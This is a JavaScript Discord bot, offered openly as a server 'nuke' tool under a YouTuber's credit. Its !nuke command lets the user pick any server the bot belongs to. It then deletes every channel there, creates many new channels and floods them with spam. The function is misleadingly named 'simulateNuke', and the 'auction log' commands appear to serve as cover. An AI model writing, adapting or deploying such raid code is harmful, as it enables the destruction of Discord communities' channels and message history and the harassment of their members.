// The orginal creator of the code is LuckyCoder YT

// YouTube - youtube.com/@LuckyCoderYT

// Discord - dsc.gg/luckycoder

// Don't Remove The Cradit or you will get ©️ Copyright 
 
const { Client, Intents, MessageActionRow, MessageSelectMenu, MessageEmbed } = require('discord.js');
const config = require('./config.json');

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.DIRECT_MESSAGES] });

// List of whitelisted server IDs
const whitelistedServers = config.whitelistedServers;

// Channel ID where auction logs will be displayed
const auctionLogChannelId = config.auctionLogChannelId;

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);

    // Set custom status
    client.user.setPresence({
        activities: [{ name: '🚀 | !help ', type: 'LISTENING' }],
        status: 'dnd' // dnd (do not disturb), online, idle, invisible
    });
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(config.prefix) || message.author.bot) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // Check if the server is whitelisted
    if (whitelistedServers.includes(message.guild.id)) {
        message.channel.send('Commands and auctions are disabled in this server.');
        return;
    }

    if (command === 'ping') {
        message.channel.send('Pong!');
    } else if (command === 'uptime') {
        message.channel.send(`Uptime: ${process.uptime()} seconds`);
    } else if (command === 'help') {
        const embed = new MessageEmbed()
            .setColor('#0099ff')
            .setTitle('Bot Commands')
            .setDescription('List of available commands:')
            .addFields(
                { name: '!ping', value: 'Check bot latency.' },
                { name: '!uptime', value: 'Check bot uptime.' },
                { name: '!nuke', value: 'Initiate nuke process on a server.' },
                { name: '!logs', value: 'View auction logs.' }
            );

        message.channel.send({ embeds: [embed] });
    } else if (command === 'nuke') {
        const guildOptions = client.guilds.cache
            .filter(guild => !whitelistedServers.includes(guild.id))
            .map(guild => ({
                label: guild.name,
                value: guild.id
            }));

        if (guildOptions.length === 0) {
            message.channel.send('No servers available for nuke.');
            return;
        }

        const guildSelectMenu = new MessageSelectMenu()
            .setCustomId('guildSelect')
            .setPlaceholder('Select a server')
            .addOptions(guildOptions);

        const row = new MessageActionRow().addComponents(guildSelectMenu);

        const embed = new MessageEmbed()
            .setColor('#0099ff')
            .setTitle('Server Nuke')
            .setDescription('Initiate a nuke process by selecting a server:')
            .addFields(guildOptions.map(guild => ({
                name: guild.label,
                value: `ID: ${guild.value}`
            })));

        // Send initial nuke message with embed and dropdown menu
        const initialMessage = await message.channel.send({ embeds: [embed], components: [row] });

        // Track ongoing nuke operations
        let nukes = {};

        nukes[initialMessage.id] = {
            message: initialMessage,
            started: Date.now(),
            selectedGuildId: null,
            initiator: message.author.id // Store user ID who initiated the nuke
        };

        client.on('interactionCreate', async (interaction) => {
            try {
                if (!interaction.isSelectMenu()) return;

                if (interaction.customId === 'guildSelect') {
                    const selectedGuildId = interaction.values[0];

                    const selectedGuild = client.guilds.cache.get(selectedGuildId);
                    if (!selectedGuild || whitelistedServers.includes(selectedGuildId)) return;

                    // Check if this interaction is part of an ongoing nuke
                    const nukeData = Object.values(nukes).find(nuke => nuke.message.id === interaction.message.id);
                    if (!nukeData) return;

                    // Update nuke data with selected guild
                    nukeData.selectedGuildId = selectedGuildId;

                    // Perform actions on the selected guild
                    await simulateNuke(selectedGuild);

                    // Send DM to nuke initiator
                    const user = await client.users.fetch(nukeData.initiator);
                    if (user) {
                        await user.send(`Nuke completed for server ${selectedGuild.name}.`);
                    } else {
                        console.error(`Failed to fetch user with ID ${nukeData.initiator}`);
                    }

                    // Respond to the interaction with a reply
                    await interaction.reply({ content: 'Actions completed.', ephemeral: true });

                    // Cleanup nuke data after completion
                    delete nukes[nukeData.message.id];

                    // Log the nuke completion in the specified channel
                    logNukeCompletion(nukeData.message, user);
                }
            } catch (error) {
                console.error('Error occurred in interactionCreate event:', error);
            }
        });

        async function simulateNuke(guild) {
            try {
                // Delete all channels before creating new ones
                await guild.channels.cache.forEach(async (channel) => {
                    try {
                        await channel.delete();
                    } catch (error) {
                        console.error(`Failed to delete channel ${channel.name}: ${error}`);
                    }
                });

                // Simulate actions: Create new channels, spam messages, etc.
                const channelCount = config.channelCount;
                const messagesPerChannel = config.messagesPerChannel;
                const spamMessage = config.spamMessage;

                // Create new text channels
                for (let i = 1; i <= channelCount; i++) {
                    await guild.channels.create(`${config.channelName}-${i}`, { type: 'GUILD_TEXT' });
                }

                // Spam messages in all text channels
                const channels = guild.channels.cache.filter(channel => channel.type === 'GUILD_TEXT');
                channels.forEach(async (channel) => {
                    let messageCount = 0;
                    while (messageCount < messagesPerChannel) {
                        try {
                            await channel.send(spamMessage);
                            console.log(`Message sent in ${channel.name}`);
                        } catch (error) {
                            console.error(`Failed to send message in ${channel.name}: ${error}`);
                        }
                        messageCount++;
                    }
                });
            } catch (error) {
                console.error('Error occurred in simulateNuke function:', error);
            }
        }

        function logNukeCompletion(message, user) {
            const logEmbed = new MessageEmbed()
                .setColor('#00FF00')
                .setTitle('Nuke Completed')
                .setDescription(`Nuke completed for message ${message.id}`)
                .addField('Completed by', `<@${user.id}>`)
                .setTimestamp();

            sendLogMessage(logEmbed);
        }
    } else if (command === 'logs') {
        // Check if the user has permission to view logs
        if (!message.member.permissions.has('ADMINISTRATOR')) {
            message.channel.send('You do not have permission to view logs.');
            return;
        }

        const channel = client.channels.cache.get(auctionLogChannelId);
        if (!channel || channel.type !== 'GUILD_TEXT') {
            message.channel.send('Auction log channel not found or invalid.');
            return;
        }

        // Fetch messages from the log channel
        const fetchedMessages = await channel.messages.fetch({ limit: 10 });
        const logMessages = fetchedMessages.map(msg => `**${msg.author.tag}**: ${msg.content}`);

        message.channel.send(`Recent Auction Logs:\n${logMessages.join('\n')}`);
    }
});

client.login(config.token);

// The orginal creator of the code is LuckyCoder YT

// YouTube - youtube.com/@LuckyCoderYT

// Discord - dsc.gg/luckycoder

// Don't Remove The Cradit or you will get ©️ Copyright 
 